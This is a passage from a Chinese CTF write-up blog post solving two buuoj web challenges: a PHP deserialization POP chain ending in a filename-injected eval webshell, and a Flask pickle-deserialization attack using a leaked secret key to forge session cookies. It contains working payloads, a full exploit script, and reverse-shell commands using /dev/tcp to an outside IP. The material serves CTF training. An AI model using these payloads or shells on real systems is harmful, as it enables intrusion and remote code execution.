class="hljs-variable">$telnum</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Log</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><span class="hljs-variable">$config</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Config</span>();<br><span class="hljs-variable">$log</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Log</span>();<br><span class="hljs-variable">$log</span> -&gt; data = <span class="hljs-string">&quot;log_start()&quot;</span>;<br><span class="hljs-variable">$config</span>-&gt;avatar = <span class="hljs-variable">$log</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$config</span>);<br></code></pre></td></tr></table></figure>

<p>为啥这样？请看下面三段代码</p>
<p>事实上，我们最后是想通过<code>log()</code>（即第二段代码）将我们的一句话木马写入record.php，</p>
<p>所以我们要通过<code>editconf()</code>（即第一段代码）去执行<code>log()</code>，注意看，执行<code>log()</code>的要求是<code>filesize(&quot;record.php&quot;) &gt; 0</code>，就是说record.php不能为空，</p>
<p>这就需要我们用上面的pop链做到，<code>Config.__sleep -&gt; Config.showconf() -&gt; Log.__toString </code>，通过pop链执行<code>Log.__toString </code>，从而将<code>&lt;?php\nerror_reporting(0);\n</code>写入record.php，使record.php不为空</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">editconf</span>(<span class="hljs-params"><span class="hljs-variable">$avatar</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$sex</span>, <span class="hljs-variable">$mail</span>, <span class="hljs-variable">$telnum</span></span>)</span>&#123;<br>    <span class="hljs-comment">//编辑表单内容</span><br>    <span class="hljs-variable">$Config</span> = <span class="hljs-variable language_">$this</span>-&gt;Config;<br><br>    <span class="hljs-variable">$Config</span>-&gt;avatar = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(<span class="hljs-variable">$avatar</span>);<br>    <span class="hljs-variable">$Config</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-variable">$Config</span>-&gt;sex = (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/男|女/&quot;</span>, <span class="hljs-variable">$sex</span>, <span class="hljs-variable">$matches</span>) ? <span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>] : <span class="hljs-string">&quot;武装直升机&quot;</span>);<br>    <span class="hljs-variable">$Config</span>-&gt;mail = (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.*@.*\..*/&#x27;</span>, <span class="hljs-variable">$mail</span>) ? <span class="hljs-variable">$mail</span> : <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-variable">$Config</span>-&gt;telnum = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$telnum</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>);<br>    <span class="hljs-variable language_">$this</span>-&gt;Config = <span class="hljs-variable">$Config</span>;<br><br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;/tmp/Config&quot;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$Config</span>));<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-string">&quot;record.php&quot;</span>) &gt; <span class="hljs-number">0</span>)&#123;<br>        [<span class="hljs-keyword">new</span> <span class="hljs-title class_">Log</span>(<span class="hljs-variable">$Config</span>),<span class="hljs-string">&quot;log&quot;</span>]();<br>    &#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span><span class="hljs-params">()</span>&#123;<br>        file_put_contents(<span class="hljs-string">&#x27;record.php&#x27;</span>, $<span class="hljs-keyword">this</span>-&gt;data, FILE_APPEND);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>原理明白了之后，我们形成利用session的payload：<code>aaa|O:6:&quot;Config&quot;:7:&#123;s:5:&quot;uname&quot;;N;s:6:&quot;passwd&quot;;N;s:6:&quot;avatar&quot;;O:3:&quot;Log&quot;:1:&#123;s:4:&quot;data&quot;;s:11:&quot;log_start()&quot;;&#125;s:8:&quot;nickname&quot;;N;s:3:&quot;sex&quot;;N;s:4:&quot;mail&quot;;N;s:6:&quot;telnum&quot;;N;&#125;</code></p>
<p>然后用payload制作sess_matrix文件，上传</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502260003232.png" srcset="/img/loading.gif" lazyload alt="image-20250226000355114"></p>
<p>然后在文件名处写马，⽂件名为 1’;eval($_POST[1]);# 即可</p>
<p>注意删去Cookie，防止再次写入<code>&lt;?php\nerror_reporting(0);\n</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502260005977.png" srcset="/img/loading.gif" lazyload alt="image-20250226000516856"></p>
<p>连接蚁剑，出flag</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502260007741.png" srcset="/img/loading.gif" lazyload alt="image-20250226000752628"></p>
<p>这里只能在文件名处写马，其他地方都会转义</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502260020801.png" srcset="/img/loading.gif" lazyload alt="image-20250226002020699"></p>
<h1 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h1><p>根据指引和文件读取漏洞找到源码</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502261145038.png" srcset="/img/loading.gif" lazyload alt="image-20250226114531775"></p>
<p>读了源码，发现有pickle-Python序列化漏洞</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_handler</span>():<br>    <span class="hljs-keyword">try</span>:<br>        u = session.get(<span class="hljs-string">&#x27;u&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(u, <span class="hljs-built_in">dict</span>):<br>            u = b64decode(u.get(<span class="hljs-string">&#x27;b&#x27;</span>))<br>        u = pickle.loads(u)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;uhh?&#x27;</span><br><br>    <span class="hljs-keyword">if</span> u.is_admin == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome, admin&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;who are you?&#x27;</span><br></code></pre></td></tr></table></figure>

<p>但是需要从session入手，</p>
<p>所以我们需要知道密钥，尝试读取&#x2F;proc&#x2F;self&#x2F;environ，得到</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502261201178.png" srcset="/img/loading.gif" lazyload alt="image-20250226120119760"></p>
<p>然后破解</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs matlab">命令<br>python flask_session_cookie_manager3.py decode -c <span class="hljs-string">&#x27;eyJ1Ijp7IiBiIjoiZ0FTVkdBQUFBQUFBQUFDTUNGOWZiV0ZwYmw5ZmxJd0VWWE5sY3BTVGxDbUJsQzQ9In19.Z78ADQ.DR7XN1thWnwnuFYHVh44LXAqBRE&#x27;</span> -s <span class="hljs-string">&#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span><br>结果<br>b&#x27;&#123;<span class="hljs-string">&quot;u&quot;</span>:&#123;<span class="hljs-string">&quot; b&quot;</span>:<span class="hljs-string">&quot;gASVGAAAAAAAAACMCF9fbWFpbl9flIwEVXNlcpSTlCmBlC4=&quot;</span>&#125;&#125;&#x27;<br><br></code></pre></td></tr></table></figure>

<p>我们可以知道，需要构造的秘钥结构：{“u”:{“b”:“反序列化的内容”}}</p>
<p>（注意一定要在Linux系统里运行下面脚本）</p>
<p>原因是windows和linux使用pickie.loads()反序列化的内部过程不太一样, 所以也就导致了在windows下可以通过loads()执行的内容放到linux下使用loads()加载就会失败, 所以我们需要把代码放到 linux环境里跑，得到一个base64</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">User</span> = <span class="hljs-keyword">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (<span class="hljs-keyword">object</span>,), &#123;<br>    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>,<br>    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-string">&#x27;__repr__&#x27;</span>: lambda o: o.uname,<br>    # <span class="hljs-string">&#x27;__reduce__&#x27;</span>: lambda o: (os.<span class="hljs-keyword">system</span>, (&quot;cat /flag &gt; /tmp/a&quot;,))<br>    # <span class="hljs-string">&#x27;__reduce__&#x27;</span>: lambda o: (os.<span class="hljs-keyword">system</span>,(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/your_ip/port 0&gt;&amp;1&#x27;“,))<br>&#125;)<br><br>user = pickle.dumps(User())<br>print(user)<br>print(base64.b64encode(user))<br></code></pre></td></tr></table></figure>

<p>然后构造payload</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">命令<br>python3 flask_session_cookie_manager3<span class="hljs-selector-class">.py</span> encode -s <span class="hljs-string">&quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;</span> -t <span class="hljs-string">&quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVTwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDRiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwMS4zNy44MC44My84MDgwIDA+JjEnlIWUUpQu&#x27;&#125;&#125;&quot;</span><br><br>结果<br><span class="hljs-selector-class">.eJyrVipVsqpWSlKyUkp3DA4LKXeEAmdfpwinsmSjHJMcz3L3ZOOcqhT3sJIcL__QLJegzMgIv3xPZ8MsT-cUGLvA08Uk19PZMjsqIrIsxd2v3KfKtdw32KTKr9LExNcZiCstTHxd0ss9XRy1vbJc83I8w0NDCwJLlWprASTpKyY</span><span class="hljs-selector-class">.Z78LWg</span>.AfikxUCG4pPwMOpS-<span class="hljs-number">7</span>aFswGcyi4<br></code></pre></td></tr></table></figure>

<p>开启监听，换session，访问&#x2F;admin去反序列化</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502262040223.png" srcset="/img/loading.gif" lazyload alt="image-20250226204039017"></p>
<p>也可用写脚本直接出（也是在Linux系统里运行）</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> SecureCookieSessionInterface<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://ac510cf4-043f-4d31-9b24-97cb1ede76b6.node5.buuoj.cn:81/&quot;</span><br><br><br><br># def get_secret_key():<br>    # target = url + <span class="hljs-string">&quot;/file?file=/proc/self/environ&quot;</span><br>    # r = requests.get(target)<br>    # # print(r.text)<br>    # key = re.findall(<span class="hljs-string">&#x27;key=(.*?).OLDPWD&#x27;</span>, r.text)<br>    # return str(key[<span class="hljs-number">0</span>])<br><br># secret_key = get_secret_key()<br># print(secret_key)<br><br><span class="hljs-keyword">class</span> FakeApp:<br>    # secret_key = secret_key<br>    secret_key = <span class="hljs-string">&quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;</span><br><br><span class="hljs-keyword">class</span> User(object):<br>    def __reduce__(self):<br>        <span class="hljs-keyword">import</span> os<br>        cmd = <span class="hljs-string">&quot;cat /flag &gt; /tmp/b&quot;</span><br>        return (os.<span class="hljs-keyword">system</span>, (cmd,))<br><br>exp = &#123;<br>    <span class="hljs-string">&quot;b&quot;</span>: base64.b64encode(pickle.dumps(User()))<br>&#125;<br><br># pickletools.dis(pickle.dumps(User()))<br># print(pickletools.dis(b<span class="hljs-string">&#x27;\x80\x03cprogram_main_app@@@\nUser\nq\x00)\x81q\x01.&#x27;</span>))<br><br>fake_app = FakeApp()<br>session_interface = SecureCookieSessionInterface()<br>serializer = session_interface.get_signing_serializer(fake_app)<br>cookie = serializer.dumps(<br>    # &#123;<span class="hljs-string">&#x27;u&#x27;</span>:b<span class="hljs-string">&#x27;\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04User\x94\x93\x94.&#x27;</span>&#125;<br>    &#123;<span class="hljs-string">&#x27;u&#x27;</span>: exp&#125;<br>)<br>print(cookie)<br><br>headers = &#123;<br>    <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>,<br>    <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;session=&#123;0&#125;&quot;</span>.format(cookie)<br>&#125;<br><br>req = requests.get(url + <span class="hljs-string">&quot;/admin&quot;</span>, headers=headers)<br># print(req.text)<br><br>req = requests.get(url + <span class="hljs-string">&quot;/file?file=/tmp/b&quot;</span>, headers=headers)<br>print(req.text)<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502262024402.png" srcset="/img/loading.gif" lazyload alt="image-20250226202452159"></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Web/" class="category-chain-item">Web</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/buuoj/" class="print-no-link">#buuoj</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>buuoj WP1</div>
      <div>http://example.com/2025/07/13/Buuoj_WP1/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>sangnigege</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年7月13日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/07/13/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" title="vm沙箱逃逸学习总结">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">vm沙箱逃逸学习总结</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/07/13/GHCTF2025/" title="GHCTF2025">
                        <span class="hidden-mobile">GHCTF2025</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","appKey":"rSHs3EnI9lT7nQwv5J7fcBnq","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
